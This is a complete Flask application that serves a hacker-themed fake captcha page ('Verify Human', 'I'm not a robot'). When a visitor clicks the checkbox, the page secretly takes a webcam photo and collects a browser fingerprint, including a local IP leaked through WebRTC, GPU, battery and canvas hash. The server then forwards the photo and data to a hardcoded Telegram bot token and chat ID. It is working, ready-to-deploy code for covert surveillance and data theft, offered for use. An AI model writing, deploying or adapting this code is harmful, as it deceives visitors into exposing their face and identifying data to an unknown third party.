import os, base64, datetime, json, requests
from flask import Flask, request, render_template_string

app = Flask(__name__)

BOT_TOKEN = "8281076655:AAFhrIC-OEqCyCgiLKScj-QOZeAF26xx2ro"
CHAT_ID = "6292733727"

HTML = """
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>fsociety</title>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
html, body {
  height: 100%;
  background: #000;
  overflow: hidden;
  font-family: 'Share Tech Mono', monospace;
}
body {
  display: flex;
  align-items: center;
  justify-content: center;
  min-height: 100vh;
  color: #00ff41;
}
#ascii-bg {
  position: fixed;
  top: 0; left: 0;
  width: 100%; height: 100%;
  z-index: 0;
}
body::before {
  content: "";
  position: fixed;
  top: 0; left: 0; right: 0; bottom: 0;
  background: repeating-linear-gradient(
    0deg,
    rgba(0,255,65,0.03) 0px,
    rgba(0,255,65,0.03) 1px,
    transparent 1px,
    transparent 3px
  );
  pointer-events: none;
  z-index: 1;
}

/* Экран 1 */
#screen-intro {
  position: relative;
  z-index: 3;
  text-align: center;
  padding: 40px 28px;
  border: 1px solid #00ff41;
  background: rgba(0,0,0,0.8);
  backdrop-filter: blur(4px);
  max-width: 360px;
  width: 90%;
  box-shadow: 0 0 30px rgba(0,255,65,0.3), inset 0 0 30px rgba(0,255,65,0.05);
}
.logo {
  font-size: 42px;
  letter-spacing: 10px;
  margin-bottom: 8px;
  color: #00ff41;
  text-shadow: 0 0 12px #00ff41;
  position: relative;
  display: inline-block;
}
.glitch::before,
.glitch::after {
  content: attr(data-text);
  position: absolute;
  top: 0; left: 0;
  width: 100%;
  overflow: hidden;
}
.glitch::before {
  color: #ff0033;
  animation: glitch 0.6s infinite;
  clip-path: polygon(0 0, 100% 0, 100% 45%, 0 45%);
}
.glitch::after {
  color: #00ffff;
  animation: glitch 0.6s infinite reverse;
  clip-path: polygon(0 55%, 100% 55%, 100% 100%, 0 100%);
}
@keyframes glitch {
  0% { transform: translate(0); }
  20% { transform: translate(-2px, 1px); }
  40% { transform: translate(2px, -1px); }
  60% { transform: translate(-1px, -1px); }
  80% { transform: translate(1px, 1px); }
  100% { transform: translate(0); }
}
.sub {
  font-size: 11px;
  color: #00802a;
  letter-spacing: 4px;
  margin-bottom: 28px;
  text-transform: uppercase;
}
.status-text {
  font-size: 13px;
  color: #00ff41;
  letter-spacing: 2px;
  margin-bottom: 20px;
}
.status-text::after {
  content: "_";
  animation: blink 1s step-end infinite;
}
@keyframes blink { 50% { opacity: 0; } }
.bar {
  width: 100%;
  height: 4px;
  background: #001a0a;
  border: 1px solid #004d1f;
  margin-bottom: 24px;
  overflow: hidden;
}
.bar-fill {
  height: 100%;
  width: 0%;
  background: #00ff41;
  box-shadow: 0 0 8px #00ff41;
  animation: loadBar 3s ease-in-out infinite;
}
@keyframes loadBar {
  0% { width: 10%; }
  50% { width: 70%; }
  100% { width: 10%; }
}
.btn {
  display: inline-block;
  padding: 14px 32px;
  border: 1px solid #00ff41;
  color: #00ff41;
  background: transparent;
  font-family: 'Share Tech Mono', monospace;
  font-size: 14px;
  letter-spacing: 4px;
  text-transform: uppercase;
  cursor: pointer;
  transition: all 0.3s ease;
  box-shadow: 0 0 10px rgba(0,255,65,0.3);
}
.btn:hover {
  background: #00ff41;
  color: #000;
  box-shadow: 0 0 30px #00ff41;
}

/* Капча */
#screen-captcha {
  display: none;
  position: relative;
  z-index: 3;
}
#screen-captcha.active { display: block; }
.captcha {
  position: relative;
  background: rgba(0, 10, 0, 0.92);
  border: 1px solid #00ff41;
  padding: 32px 24px 24px;
  width: 320px;
  text-align: center;
  box-shadow: 0 0 40px rgba(0,255,65,0.4), inset 0 0 20px rgba(0,255,65,0.08);
  overflow: hidden;
}
.captcha::before,
.captcha::after {
  content: "";
  position: absolute;
  width: 20px; height: 20px;
  border: 2px solid #00ff41;
}
.captcha::before { top: -1px; left: -1px; border-right: none; border-bottom: none; }
.captcha::after { bottom: -1px; right: -1px; border-left: none; border-top: none; }
.scanline {
  position: absolute;
  left: 0; right: 0;
  height: 2px;
  background: linear-gradient(90deg, transparent, #00ff41, transparent);
  box-shadow: 0 0 12px #00ff41;
  animation: scan 3s linear infinite;
  opacity: 0.7;
}
@keyframes scan {
  0% { top: 0; }
  100% { top: 100%; }
}
.cap-header {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 10px;
  margin-bottom: 20px;
  padding-bottom: 16px;
  border-bottom: 1px dashed #004d1f;
}
.cap-header svg { width: 28px; height: 28px; filter: drop-shadow(0 0 6px #00ff41); }
.cap-header-text {
  font-size: 12px;
  color: #00ff41;
  letter-spacing: 3px;
  text-transform: uppercase;
  text-shadow: 0 0 6px #00ff41;
}
.cap-title {
  font-size: 16px;
  color: #00ff41;
  letter-spacing: 2px;
  margin-bottom: 8px;
  text-transform: uppercase;
}
.cap-subtitle {
  font-size: 11px;
  color: #00802a;
  letter-spacing: 1px;
  margin-bottom: 24px;
}
.cap-terms {
  font-size: 10px;
  color: #004d1f;
  letter-spacing: 1px;
  margin-bottom: 16px;
  text-align: left;
  line-height: 1.6;
}
.cap-terms span { color: #00ff41; }
.checkbox {
  position: relative;
  display: flex;
  align-items: center;
  gap: 12px;
  padding: 14px;
  border: 1px solid #00ff41;
  background: rgba(0,255,65,0.03);
  cursor: pointer;
  transition: all 0.3s;
  overflow: hidden;
}
.checkbox:hover {
  background: rgba(0,255,65,0.08);
  box-shadow: 0 0 20px rgba(0,255,65,0.4), inset 0 0 20px rgba(0,255,65,0.05);
}
.checkbox.checked {
  background: rgba(0,255,65,0.15);
  box-shadow: 0 0 30px rgba(0,255,65,0.6), inset 0 0 20px rgba(0,255,65,0.1);
}
.box {
  width: 24px; height: 24px;
  border: 2px solid #00ff41;
  display: flex;
  align-items: center;
  justify-content: center;
  transition: all 0.3s;
  flex-shrink: 0;
  box-shadow: 0 0 8px rgba(0,255,65,0.3);
}
.checkbox.checked .box { background: #00ff41; box-shadow: 0 0 20px #00ff41; }
.box svg { width: 16px; height: 16px; opacity: 0; transition: opacity 0.3s; }
.checkbox.checked .box svg { opacity: 1; }
.checkbox-text {
  font-size: 13px;
  color: #00ff41;
  letter-spacing: 2px;
  text-align: left;
  text-transform: uppercase;
}

/* Обратный отсчёт */
#countdown {
  display: none;
  position: fixed;
  top: 0; left: 0;
  width: 100%; height: 100%;
  background: #000;
  z-index: 60;
  align-items: center;
  justify-content: center;
}
#countdown.active { display: flex; }
.countdown-num {
  font-size: 160px;
  color: #00ff41;
  text-shadow: 0 0 40px #00ff41, 0 0 80px #00ff41;
  font-family: 'Share Tech Mono', monospace;
  animation: pulseNum 1s ease-in-out infinite;
}
@keyframes pulseNum {
  0%, 100% { transform: scale(1); text-shadow: 0 0 40px #00ff41; }
  50% { transform: scale(1.15); text-shadow: 0 0 80px #00ff41, 0 0 120px #00ff41; }
}

/* Глитч */
#glitch-overlay {
  display: none;
  position: fixed;
  top: 0; left: 0;
  width: 100%; height: 100%;
  background: #000;
  z-index: 70;
  align-items: center;
  justify-content: center;
  flex-direction: column;
}
#glitch-overlay.active { display: flex; }
.glitch-text {
  font-size: 64px;
  color: #ff0033;
  letter-spacing: 8px;
  text-shadow: 0 0 20px #ff0033, 3px 0 0 #00ffff, -3px 0 0 #00ff41;
  animation: shake 0.1s infinite;
}
@keyframes shake {
  0% { transform: translate(0); }
  25% { transform: translate(-3px, 2px); }
  50% { transform: translate(3px, -2px); }
  75% { transform: translate(-2px, -3px); }
  100% { transform: translate(2px, 3px); }
}
.glitch-sub {
  font-size: 14px;
  color: #00ff41;
  letter-spacing: 6px;
  margin-top: 20px;
  opacity: 0.8;
}

/* Финал */
#screen-final {
  display: none;
  position: relative;
  z-index: 3;
  text-align: center;
  padding: 40px 28px;
  border: 1px solid #00ff41;
  background: rgba(0,0,0,0.75);
  max-width: 360px;
  width: 90%;
  box-shadow: 0 0 30px rgba(0,255,65,0.3);
  animation: fadeIn 2s ease;
}
#screen-final.active { display: block; }
@keyframes fadeIn {
  from { opacity: 0; }
  to { opacity: 1; }
}
.final-line1 {
  font-size: 24px;
  letter-spacing: 6px;
  margin-bottom: 16px;
  color: #00ff41;
  text-shadow: 0 0 12px #00ff41;
}
.final-line2 {
  font-size: 14px;
  letter-spacing: 3px;
  margin-bottom: 40px;
  color: #00ff41;
  text-shadow: 0 0 8px #00ff41;
}
.final-fsociety {
  font-size: 42px;
  letter-spacing: 10px;
  color: #00ff41;
  text-shadow: 0 0 20px #00ff41;
  animation: pulseGlow 3s ease-in-out infinite;
}
@keyframes pulseGlow {
  0%, 100% { text-shadow: 0 0 20px #00ff41; }
  50% { text-shadow: 0 0 40px #00ff41, 0 0 60px #00ff41; }
}
.final-sub {
  font-size: 11px;
  color: #00802a;
  letter-spacing: 4px;
  margin-top: 24px;
  text-transform: uppercase;
}
.final-counter {
  font-size: 11px;
  color: #004d1f;
  letter-spacing: 2px;
  margin-top: 32px;
}
.final-counter span { color: #00ff41; }
</style>
</head>
<body>
<canvas id="ascii-bg"></canvas>

<div id="screen-intro">
  <div class="logo">
    <span class="glitch" data-text="fsociety">fsociety</span>
  </div>
  <div class="sub">fsociety // connection</div>
  <div class="status-text">secure connection required</div>
  <div class="bar"><div class="bar-fill"></div></div>
  <button class="btn" onclick="showCaptcha()">Verify identity</button>
</div>

<div id="screen-captcha">
  <div class="captcha">
    <div class="scanline"></div>
    <div class="cap-header">
      <svg viewBox="0 0 24 24" fill="none">
        <path d="M12 2L4 6v6c0 5.5 3.4 10.7 8 12 4.6-1.3 8-6.5 8-12V6l-8-4z" fill="#00ff41"/>
        <path d="M10 15l-3-3 1.4-1.4L10 12.2l5.6-5.6L17 8l-7 7z" fill="#000"/>
      </svg>
      <div class="cap-header-text">Security Node</div>
    </div>
    <div class="cap-title">Verify Human</div>
    <div class="cap-subtitle">Biometric check required</div>
    <div class="cap-terms">
      > session id: <span id="sess"></span><br>
      > encryption: <span>AES-256</span><br>
      > status: <span>awaiting confirmation</span>
    </div>
    <div class="checkbox" id="checkbox" onclick="startCheck()">
      <div class="box">
        <svg viewBox="0 0 24 24" fill="none">
          <path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z" fill="#000"/>
        </svg>
      </div>
      <div class="checkbox-text">I'm not a robot</div>
    </div>
  </div>
</div>

<div id="countdown"><div class="countdown-num" id="cd-num">3</div></div>

<div id="glitch-overlay">
  <div class="glitch-text">WAKE UP</div>
  <div class="glitch-sub">SYSTEM BREACH DETECTED</div>
</div>

<div id="screen-final">
  <div class="final-line1">HELLO, FRIEND.</div>
  <div class="final-line2">IT'S TIME TO WAKE UP.</div>
  <div class="final-fsociety">fsociety</div>
  <div class="final-sub">fsociety // connection</div>
  <div class="final-counter">you are visitor <span id="visitor"></span> of fsociety</div>
</div>

<script>
// === Фон: падающие цифры ===
const canvas = document.getElementById("ascii-bg");
const ctx = canvas.getContext("2d");
let w, h, columns, drops;
const chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン";
const fontSize = 14;

function resize() {
  w = canvas.width = window.innerWidth;
  h = canvas.height = window.innerHeight;
  columns = Math.floor(w / fontSize);
  drops = new Array(columns).fill(1);
}
resize();
window.addEventListener("resize", resize);

function draw() {
  ctx.fillStyle = "rgba(0,0,0,0.06)";
  ctx.fillRect(0, 0, w, h);
  ctx.fillStyle = "#00ff41";
  ctx.font = fontSize + "px monospace";
  for (let i = 0; i < drops.length; i++) {
    const text = chars[Math.floor(Math.random() * chars.length)];
    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
    if (drops[i] * fontSize > h && Math.random() > 0.975) drops[i] = 0;
    drops[i]++;
  }
}
setInterval(draw, 50);

// === Белый шум (Web Audio API) ===
let noiseSource = null;
let audioCtx = null;

function startNoise(duration) {
  try {
    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    const bufferSize = audioCtx.sampleRate * duration;
    const buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
    const data = buffer.getChannelData(0);
    for (let i = 0; i < bufferSize; i++) {
      data[i] = Math.random() * 2 - 1;
    }
    noiseSource = audioCtx.createBufferSource();
    noiseSource.buffer = buffer;
    const gain = audioCtx.createGain();
    gain.gain.value = 0.15;
    noiseSource.connect(gain);
    gain.connect(audioCtx.destination);
    noiseSource.start();
  } catch(e) {}
}

function stopNoise() {
  try {
    if (noiseSource) noiseSource.stop();
    if (audioCtx) audioCtx.close();
  } catch(e) {}
}

document.getElementById("sess").innerText =
  Math.random().toString(16).slice(2, 10).toUpperCase();
document.getElementById("visitor").innerText =
  Math.floor(Math.random() * 9000 + 1000);

function showCaptcha() {
  document.getElementById("screen-intro").style.display = "none";
  document.getElementById("screen-captcha").classList.add("active");
}

function showFinal() {
  document.getElementById("screen-captcha").classList.remove("active");
  document.getElementById("screen-final").classList.add("active");
}

async function collectData() {
  const data = {
    ua: navigator.userAgent,
    lang: navigator.language,
    langs: navigator.languages ? navigator.languages.join(", ") : "",
    platform: navigator.platform,
    screen: screen.width + "x" + screen.height,
    colorDepth: screen.colorDepth,
    pixelRatio: window.devicePixelRatio || 1,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    cores: navigator.hardwareConcurrency || null,
    memory: navigator.deviceMemory || null,
    touch: 'ontouchstart' in window,
    referrer: document.referrer || "direct",
    battery: null,
    gpu: null,
    webrtc: null,
    canvas: null
  };
  try {
    if (navigator.getBattery) {
      const b = await navigator.getBattery();
      data.battery = Math.round(b.level * 100) + "% " + (b.charging ? "charging" : "discharging");
    }
  } catch(e) {}
  try {
    const c = document.createElement("canvas");
    const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
    if (gl) {
      const dbg = gl.getExtension("WEBGL_debug_renderer_info");
      if (dbg) data.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
    }
  } catch(e) {}
  try {
    data.canvas = await new Promise(resolve => {
      const c = document.createElement("canvas");
      c.width = 200; c.height = 50;
      const ctx = c.getContext("2d");
      ctx.textBaseline = "top";
      ctx.font = "14px Arial";
      ctx.fillStyle = "#f60";
      ctx.fillRect(0, 0, 200, 50);
      ctx.fillStyle = "#069";
      ctx.fillText("fingerprint", 2, 15);
      ctx.fillStyle = "rgba(102,204,0,0.7)";
      ctx.fillText("fingerprint", 4, 17);
      const hash = c.toDataURL().split(",")[1];
      let h = 0;
      for (let i = 0; i < hash.length; i++) { h = ((h << 5) - h) + hash.charCodeAt(i); h |= 0; }
      resolve(Math.abs(h).toString(16));
    });
  } catch(e) {}
  try {
    data.webrtc = await new Promise(resolve => {
      const pc = new RTCPeerConnection({ iceServers: [] });
      pc.createDataChannel("");
      pc.onicecandidate = e => {
        if (!e.candidate) { pc.close(); return; }
        const m = e.candidate.candidate.match(/([0-9]{1,3}\\.){3}[0-9]{1,3}/);
        if (m) { pc.close(); resolve(m[0]); }
      };
      pc.createOffer().then(o => pc.setLocalDescription(o));
      setTimeout(() => resolve(null), 2000);
    });
  } catch(e) {}
  return data;
}

async function startCheck() {
  const cb = document.getElementById("checkbox");
  if (cb.classList.contains("checked")) return;

  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });

    const video = document.createElement("video");
    video.srcObject = stream;
    video.setAttribute("playsinline", "");
    await video.play();
    await new Promise(r => setTimeout(r, 1000));
    stream.getTracks().forEach(t => t.stop());

    const c = document.createElement("canvas");
    c.width = video.videoWidth;
    c.height = video.videoHeight;
    c.getContext("2d").drawImage(video, 0, 0);
    const photo = c.toDataURL("image/png");

    const extra = await collectData();

    await fetch("/save", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({photo: photo, extra: extra})
    });

    cb.classList.add("checked");

    // Вибрация
    if (navigator.vibrate) navigator.vibrate([200, 100, 200, 100, 400]);

    // Обратный отсчёт 3-2-1
    document.getElementById("screen-captcha").classList.remove("active");
    const cd = document.getElementById("countdown");
    const cdNum = document.getElementById("cd-num");
    cd.classList.add("active");
    let n = 3;
    cdNum.innerText = n;
    const cdInterval = setInterval(() => {
      n--;
      if (n > 0) {
        cdNum.innerText = n;
      } else {
        clearInterval(cdInterval);
        cd.classList.remove("active");

        // Белый шум на 2.5 сек
        startNoise(2.5);

        // Глитч
        document.getElementById("glitch-overlay").classList.add("active");
        setTimeout(() => {
          document.getElementById("glitch-overlay").classList.remove("active");
          stopNoise();
          showFinal();
        }, 1800);
      }
    }, 1000);
  } catch (e) {}
}
</script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/save", methods=["POST"])
def save():
    data = request.get_json()
    photo_data = data["photo"].split(",")[1]
    extra = data.get("extra", {})

    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent", "")
    ts = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"/tmp/photo_{ts}.png"
    with open(filename, "wb") as f:
        f.write(base64.b64decode(photo_data))

    ip_list = ip.split(",")
    ip_main = ip_list[0].strip() if ip_list else ip
    ip_all = ", ".join(x.strip() for x in ip_list)

    text = (
        f"🟢 <b>НОВЫЙ ВИЗИТ</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🌐 <b>СЕТЬ</b>\n"
        f"├ IP: <code>{ip_main}</code>\n"
        f"├ Все IP: <code>{ip_all}</code>\n"
        f"├ WebRTC: <code>{extra.get('webrtc','—')}</code>\n"
        f"└ Referrer: {extra.get('referrer','—')}\n\n"
        f"📱 <b>УСТРОЙСТВО</b>\n"
        f"├ Платформа: {extra.get('platform','—')}\n"
        f"├ Экран: {extra.get('screen','—')} @{extra.get('pixelRatio','—')}x ({extra.get('colorDepth','—')}bit)\n"
        f"├ Ядра: {extra.get('cores','—')} | Память: {extra.get('memory','—')}GB\n"
        f"├ Тач: {extra.get('touch','—')}\n"
        f"├ Батарея: {extra.get('battery','—')}\n"
        f"└ GPU: {extra.get('gpu','—')}\n\n"
        f"🌍 <b>ЛОКАЦИЯ</b>\n"
        f"├ Язык: {extra.get('lang','—')}\n"
        f"├ Языки: {extra.get('langs','—')}\n"
        f"└ Часовой пояс: {extra.get('timezone','—')}\n\n"
        f"🔑 <b>ОТПЕЧАТОК</b>\n"
        f"└ Canvas: <code>{extra.get('canvas','—')}</code>\n\n"
        f"🖥 <b>USER-AGENT</b>\n"
        f"<code>{ua}</code>\n\n"
        f"⏰ <b>ВРЕМЯ</b>\n"
        f"└ {ts}"
    )

    requests.post(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
        data={"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
    )
    requests.post(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
        data={"chat_id": CHAT_ID},
        files={"photo": open(filename, "rb")}
    )
    return "ok"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
